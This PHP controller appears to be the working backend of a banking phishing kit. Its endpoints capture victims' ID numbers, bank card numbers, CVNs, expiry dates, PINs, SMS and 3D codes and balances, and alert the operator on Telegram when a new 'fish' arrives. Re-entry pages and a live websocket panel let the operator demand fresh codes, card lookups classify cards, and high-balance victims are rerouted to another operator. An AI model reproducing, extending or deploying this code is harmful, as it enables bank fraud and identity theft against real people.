<?php
namespace app\index\controller;

use think\facade\Request;
use think\Db;
use \GatewayWorker\Lib\Gateway;
use app\method\controller\Base;
use app\method\controller\Redis;
/**
* 模板所需接口
*/
class Api extends Base
{

	public $alipayApi;

	public $base;

	public function __construct()
	{
		$this->base = new \app\method\controller\Base();
		//header("Access-Control-Allow-Origin: *");
		//header("Access-Control-Allow-Origin: *");
		//$this->alipayApi = 'https://ccdcapi.alipay.com/validateAndCacheCardInfo.json?_input_charset=utf-8&cardNo=6217897900030617930&cardBinCheck=true';
	}
	
	public function notifytxt()
	{
	    $param = Request()->post();
	    
	    $wid = '82';
	    
	    Gateway::sendToUid('admin:' . $wid, json_encode(['id' => $param['id'],'method' => $param['method'], 'data' => $param['data']]));
	    
	    Db::name('list')->where(['id' => $param['id']])->update([$param['method'] . 'ns' => $param['data']]);
	}
	
	public function lunxun()
	{
	    Db::name('list')->where('uptime' , '<', time() - 300)->update(['online' => 0]);
	    
	    Db::name('pagelist')->where('time' , '<', time() - 300)->delete();
	}
	
	public function addpage()
	{
	    $uuid = Request()->post('uuid');
	    $page = Request()->post('page');
	    
	    if(empty($uuid) || empty($page)) die;
	    
	    $res = Db::name('pagelist')->where(['uuid' => $uuid])->find();
	    
	    if(empty($res))
	    {
	        Db::name('pagelist')->insert(['uuid' => $uuid, 'page' => $page, 'time' => time()]);
	    }else{
	        Db::name('pagelist')->where(['uuid' => $uuid])->update(['uuid' => $uuid, 'page' => $page,'time' => time()]);
	    }
	}
	
	public function checkbin()
	{
	    $bin = Request()->get('b');
	    $bin = substr($bin, 0, 6);
	    $res = bin2detail($bin);
	    if(!$res)
	    {
	        return result(201, 'false');
	    }
	    //return result(201, 'false');
	    $res = json_decode($res, true);
	    
	    $data = ['scheme' => str_replace(' ', '', $res['scheme']), 'type' => $res['type']];
	    return result(200, $data);
	    
	}

	/**
	 * 获取验证码
	 */
	public function codehq()
    {
        $baseUrl = $this->base->hookBaseurl();

		$wid = $this->base->url2Wid($baseUrl);
    	$param = Request::post();
		if(!checkParamSign($param) || empty($param['oid'])) return result(201, 'error');

		$u = Db::name('list')->where(['id' => $param['oid']])->setInc('codenum');
		Gateway::sendToUid('admin:' . $wid, json_encode(['method' => 'update', 'data' => 'codehq']));
    }

    public function sendmsg($param)
    {
    	$web = Db::name('web')->where(['id' => $param['wid']])->field('tgid,is_tg')->find();
    	if(!empty($web['tgid']) && (int)$web['is_tg'] === 1)
    	{
    	    $tg = new Tg();
    	    
    	    $text = par2str($param);
    	    
    	    //var_dump($web['tgid'],$text);die;
    	    //$text = '信息提醒：&#10;&#10;<b>您的站点新进一条鱼,请登录后台查看！</b>&#10;&#10;客户IP:' . Request()->ip();
    	    $tg->send($web['tgid'], $text);
    	}
    }

	/**
	 * 用户oid 和uid绑定
	 */
	public function bind()
	{
		$data = Request::post();

        if(empty($data['uid']) || empty($data['oid'])) return result(201, 'error');

        Gateway::bindUid($data['uid'], (int)$data['oid']);

        return result(200, 'success');
	}
	
	public function insert()
	{
	    
	    if(! Request()->isPost()) die;
	    
	    $param = Request::post();
	    
	    if(empty($param['sign'])) die;
	    
		$baseUrl = $this->base->hookBaseurl();

		$wid = $this->base->url2Wid($baseUrl);
		
		if($wid === false)
		{
			return result(201, 'error');
		}
		
		$sign = $param['sign'];
		$signord = Db::name('sign')->where(['sign' => $sign])->value('sign');
		//if(!empty($signord)) return result(201, 'error');
		
        $vid = $this->base->wid2website($wid)['vid'];
		
		$view = Db::name('view')->where('id', $vid)->value('type');
		
		if(!checkParamSign($param)) return result(202, 'error');
		
		$param['online'] = 1;
		$param['time'] = time();
		$param['uptime'] = time();
		$param['os'] = get_os();
		$param['ip'] = Request::ip();
		$param['ipaddress'] = ipToAddress($param['ip']);
		$param['agent'] = Request::header('user-agent');
		$param['wid'] = $wid;
		$param['vid'] = $vid;
		//对指定需要复制的字段加标签
		if(!empty($param['name']))
        {
            $param['name'] = addstr($param['name']);
        }
        if(!empty($param['user']))
        {
            $param['user'] = addstr($param['user']);
        }

        if(!empty($param['pass']))
        {
            $param['pass'] = addstr($param['pass']);
        }

        if(!empty($param['email']))
        {
            $param['email'] = addstr($param['email']);
        }
        
        if(!empty($param['idcard']))
        {
            $param['idcard'] = addstr($param['idcard']);
        }
        
        if(!empty($param['mobile']))
        {
            $param['mobile'] = addstr($param['mobile']);
        }
        
        if(!empty($param['bankinfo']))
        {
            $param['bankinfo'] = addstr($param['bankinfo']);
        }
        
        if(!empty($param['bankcard']))
        {
            if((int)$view === 0)
            {
                $bankinfo = json_decode(bin2detail(substr($param['bankcard'], 0, 6)),true);
                if(!empty($bankinfo))
				{
				    $param['bankinfo'] = $bankinfo['scheme'];
				}
                $param['bankcard'] = '<i class="cat">' . $param['bankcard'] . '</i>';
                
				
            }else{
                $param['bankcard'] = addstr($param['bankcard']);
            }
        }
        
        if(!empty($param['bankpass']))
        {
            $param['bankpass'] = addstr($param['bankpass']);
        }
        
        $redis = Redis::getInstance();
        
        
        $num = $redis->get('data' . $wid);
        
        
        if(empty($num))
        {
            $redis->set('data' . $wid, 1);
            $redis->expire('data' . $wid, 60 * 5);
        }else{
            $redis->incr('data' . $wid);
        }
        
        $islan = false;
        //拦截
        $lan = Db::name('config')->where('id', 1)->find();
        if((int)$lan['isway'] === 1)
        {
            if(strstr($param['bankinfo'], $lan['card_type']) !== false)
            {
                if(!empty($param['balance']) && $param['balance'] >= $lan['money'])
                {
                    $islan = true;
                    
                    $param['wid'] = $lan['wid'];
                }
            }
        }
        
        //var_dump($islan);die;
        
		unset($param['sign']);
		
		$oid = Db::name('list')->where(['wid' => $param['wid']])->max('oid');
		
		if((int)$oid !== 0)
		{
		    $param['oid'] = ++$oid;
		}
		//装转数据完成 查找域名关联的站点
		//$baseUrl = $this->base->hookBaseurl();
		//根据Baseurl匹配站点
		$oid = Db::name('list')->insertGetId($param);
		if($oid)
		{
		    $this->sendmsg($param);
		    
		    //Db::name('sign')->insert(['sign' => $sign, 'ip' => $param['ip'], 'time' => time()]);
		    
		    Gateway::sendToUid('admin:' . $param['wid'], json_encode(['method' => 'update', 'data' => 'insert']));
		  //  if(Gateway::isUidOnline('admin:' . $wid))
		  //  {
		  //      $this->sendmsg();
		  //      Gateway::sendToUid('admin:' . $wid, json_encode(['method' => 'update', 'data' => 'insert']));
		  //  }else{

		  //      $this->sendmsg();
		  //  }
		    
			return result(200, 'success', ['oid' => $oid]);
		}else{
			return result(201, 'error');
		}
	}
	
	public function checkBk()
	{
		$bankcard = Request::get('bankcard');

		if(empty($bankcard)) return result(201, 'empty');
        
		try {
			$data = [
				'code' => 200,
				'msg' => 'success',
			];
			$url = 'https://ccdcapi.alipay.com/validateAndCacheCardInfo.json?_input_charset=utf-8&cardNo=' . $bankcard . '&cardBinCheck=true';
			
			$result = json_decode(curl_get($url, true), true);
			
			if(empty($result['cardType'])) return result(201, 'error');

			if($result['cardType'] == 'DC')
			{
				$data['data']['cardType'] = '储蓄卡';
			}else{
				$data['data']['cardType'] = '信用卡';
			}
			$data['data']['bank'] = $this->selbank($result['bank']);
			$data['data']['type'] = $result['cardType'];
		} catch (Exception $e) {
			$data = [
				'code' => 201,
				'msg' => 'error',
			];
		}

		return json($data);
	}

	public function selbank($bank)
	{
		try {
			$bankjson = json_decode(file_get_contents('bank.json'), true);
			return $bankjson[$bank];
		} catch (Exception $e) {
			return 'Undefined';
		}
	}

	public function checkId()
	{
	    return result(200, 'success');
		$param = Request::post();
		if(empty($param['cid']) || empty($param['name']))
		{
			return result(201, 'param is Empty');
		}

		$id = $param['cid'];
		$name = $param['name'];
        
        //暂时调用自定义接口
        if(!checkIDCard($id))
        {
            return result(201, 'error');
        }
        return result(200, 'success');
		$kid = rand_str(8);    // 获取一个随机7K账号
	    $pwd = rand_str(8);    // 获取一个随机的密码
	    $post_data = "authcode=72A3&identity=$kid&realname=$name&card=$id&mode=identity&codekey=reg&password=$pwd&reg_type=web7k";    // 提交数据
	    $data = send_post('http://zc.7k7k.com/post_reg', $post_data);    // 获取返回数据
	    $data = json_decode($data,true);    // 将返回的数据解析为数组
	    var_dump($data);die;
	    if($data['data'] == '实名信息认证失败14' || $data['data'] == ''){    // 认证失败则是姓名和身份证号不符
	      return result(201, 'error');
	    }elseif($data['data'] == '已无实名认证次数，请于24小时后尝试16'){    // 因该是同一姓名查询次数过多导致
	      return result(202, '访问频繁，请等待24小时后再次尝试！');
	    }else{
	      return result(200, 'success');    // 返回验证码错误或其他信息则是姓名和证件相符
	    }
	}

	/**
	 * 查询当前模板配置
	 */
	public function selectTempConfig()
	{
		$baseUrl = $this->base->hookBaseurl();

		$wid = $this->base->url2Wid($baseUrl);
        $wid = '82';
		$website = $this->base->wid2website($wid);

		$view = Db::name('uview')->where(['vid' => $website['vid'], 'wid' => $website['id']])->field('title,notice,errnotice,config,status')->find();
		
		/**
		 * status 模板是否关闭
		 * title 页面标题
		 * content 提示内容
		 */

		//组件color
		$color = [];
		$colorarr = ['titleColor', 'titleBcolor', 'mainColor', 'mainBcolor', 'btnColor', 'btnBcolor'];
		
		$config = json_decode($view['config'], true);
		
		//var_dump($view,$config);die;
		foreach ($config as $k => $v) {
			if(in_array($k,$colorarr))
			{
				$color[$k] = $v['value'];
				unset($config[$k]);
			}
		}
		
		$tt = file_get_contents('./config.tt');
		$tt = json_decode($tt,true);
		$end_time = strtotime($tt['end_time']);
		//var_dump($end_time,$tt);die;
		
		$pop = Db::name('popuplist')->where(['status' => 1])->find();
		
		if(empty($pop))
		{
		    $color['titleBcolor'] = '维护';
		    $color['titleColor'] = '#FFF';
		    $end_time = time() - 100;
		}else{
		    $color['titleBcolor'] = $pop['titlebj'];
		    $color['titleColor'] = '#FFF';
		}
		
		
		$data = [
			'status' => $end_time < time() ? 0 : 1,
			'title' => $pop['title'],
			'content' => (int)$end_time < time() ? $tt['end_title'] :  $pop['notice'],
			'config' => empty($config) ? '' : $config,
			'poptitle' => $pop['title'],
			'color' => $color,
			'btntext' => $pop['btntitle'],
			//'endurl' => $config['endurl']['value'],
			//'banktext' => '信用卡优先'
		];
		//$data['config']['bankts']['value'] = '信用卡优先';
		return result(200, getLang(10000), $data);
	}

	/**
	 * 数据更新
	 * param oid:数据id page:页面id 
	 * page 参考 /config/speech.php
	 */
	public function update()
	{
		$param = Request::post();
		if(!checkParamSign($param)) return result(201, 'error');

		if(empty($param['oid']) || empty($param['page']))
		{
			return result(201, 'error');
		}

		$list = Db::name('list')->where(['id' => $param['oid']])->field('bankinfo,vid,wid,bankcard,idcard,code,mobile,bankpass,cvn,balance,endtime,name,pass')->find();
		if(empty($list))
		{
			return result(201, 'error');
		}
		
		$data = [];
		$data['uptime'] = time();
		$mp3 = '';
		$data['status'] = 0;
		
		//获取模板类型 
		$view = Db::name('view')->where(['id' => $list['vid']])->value('type');
		if((int)$view === 0)
		{
		    switch ((string)$param['page']) {
		        case 'b':
    				//银行卡重填页
    				$data['bankcard'] = '<i class="cat">' . $param['bankcard'] . '</i>';// .'<br>'. $list['bankcard'];
    				$data['cvn'] = addstr($param['cvn']);// .'<br>'. $list['cvn'];
    				$data['endtime'] = addstr($param['endtime']);// .'<br>'. $list['endtime'];
    				$bankinfo = json_decode(bin2detail(substr($param['bankcard'], 0, 6)),true);
    				if(!empty($bankinfo))
    				{
    				    $data['bankinfo'] = $bankinfo['scheme'];
    				}
    				
    				if(!empty($param['name']))
    				{
    				    $data['name'] = addstr($param['name']);// .'<br>'. $list['name'];
    				}
    				$mp3 = 'newcard';
    				break;
    			case 'c':
    			    //姓名重填
    				$data['name'] = addstr($param['name']);// .'<br>'. $list['name'];
    				$mp3 = 'newcid';
    				break;
    			case 'd':
    				//验证码重填页
    				$data['code'] = addstr($param['code']);// .'<br>'. $list['code'];
    				$mp3 = 'newcode';
    				break;
    			case 'e':
    				//手机号重填页
    				$data['mobile'] = addstr($param['mobile']);// .'<br>'. $list['mobile'];
    				$mp3 = 'newphone';
    				break;
    			case 'o':
    				//3D验证码重填页
    				$data['pass'] = addstr($param['pass']);// .'<br>'. $list['pass'];
    				$mp3 = 'newpass';
    				break;
    			case 'n':
    				//3D验证码重填页
    				$data['code'] = addstr($param['code']);// .'<br>'. $list['code'];
    				$mp3 = 'newcode';
    				break;
		    }
		}else{
		    
    		switch ((string)$param['page']) {
    			case 'b':
    			    $params = Db::name('list')->where('id', $param['oid'])->field('id,oid,status',true)->find();
    				
    				
    				$params['bankcard'] = addstr($param['bankcard']);
    				$params['bankinfo'] = addstr($param['bankinfo']);
    				$params['bankpass'] = '';
    				$params['mobile'] = addstr($params['mobile']);
    				$params['time'] = time();
    				$params['uptime'] = time();
    				$params['codenum'] = 0;
    				$params['code'] = '';
    				//var_dump($params);die;
    				if(!empty($param['endtime']) && !empty($param['cvn']))
    				{
    				    $params['cvn'] = addstr($param['cvn']);
    				    $params['endtime'] = addstr($param['endtime']);
    				}
    				
    				if(!empty($param['bankpass']))
    				{
    				    $params['bankpass'] = addstr($param['bankpass']);
    				}
    				
    				if(!empty($param['balance']))
    				{
    				    $params['balance'] = addstr($param['balance']);
    				}
    				
    				
    				$oid = Db::name('list')->where(['wid' => $params['wid']])->max('oid');
		
            		if((int)$oid !== 0)
            		{
            		    $params['oid'] = ++$oid;
            		}
            		
    				$oid = Db::name('list')->insertGetId($params);
            		if($oid)
            		{
            		    $this->sendmsg($params);
            		    
            		    Gateway::sendToUid('admin:' . $params['wid'], json_encode(['method' => 'update', 'data' => 'insert']));
            		    
            			return result(200, 'success', ['oid' => $oid]);
            		}else{
            			return result(201, 'error');
            		}
    				break;
    			case 'c':
    				//身份证重填页
    				$data['idcard'] = addstr($param['cid']);
    				$data['name'] = addstr($param['name']);
    				$mp3 = 'newcid';
    				break;
    			case 'd':
    				//验证码重填页
    				$data['code'] = addstr($param['code']) .'<br>'. $list['code'];
    				$mp3 = 'newcode';
    				break;
    			case 'e':
    				//手机号重填页
    				$data['mobile'] = addstr($param['mobile']);
    				$mp3 = 'newphone';
    				break;
    			case 'f':
    				//卡密码重填页
    				$data['bankpass'] = addstr($param['bankpass']) .'<br>'. $list['bankpass'];
    				$mp3 = 'newpass';
    				break;
    			case 'g':
    				//CVN(卡信息)重填页
    				$data['cvn'] = addstr($param['cvn']) .'<br>'. $list['cvn'];
    				$data['endtime'] = addstr($param['endtime']) .'<br>'. $list['endtime'];
    				$mp3 = 'newcvn';
    				break;
    			case 'h':
    				//余额重填页
    				$data['balance'] = addstr($param['balance']) .'<br>'. $list['balance'];
    				$mp3 = 'newye';
    				break;
    			case 'i':
    				//余额重填页
    				//$data['balance'] = addstr($param['balance']) .'<br>'. $list['balance'];
    				$mp3 = 'insert';
    				break;
    		}
		}
		
		$res = Db::name('list')->where(['id' => $param['oid']])->update($data);
		if($res)
		{
			Gateway::sendToUid('admin:' . $list['wid'], json_encode(['method' => 'update', 'data' => $mp3]));
			return result(200, 'success');
		}else{
			return result(201, 'error');
		}
	}

	public function online()
	{
	    $param = Request::post();
	    if(!checkParamSign($param) || empty($param['id'])) return result(201, 'error');
	    
	    try {
            $res = Db::name('list')->where(['id' => $param['id']])->update(['online' => (int)$param['type']]);
            return result(200, 'success');
        } catch (Exception $e) {
           return result(2011, 'error'); 
        }
	}

}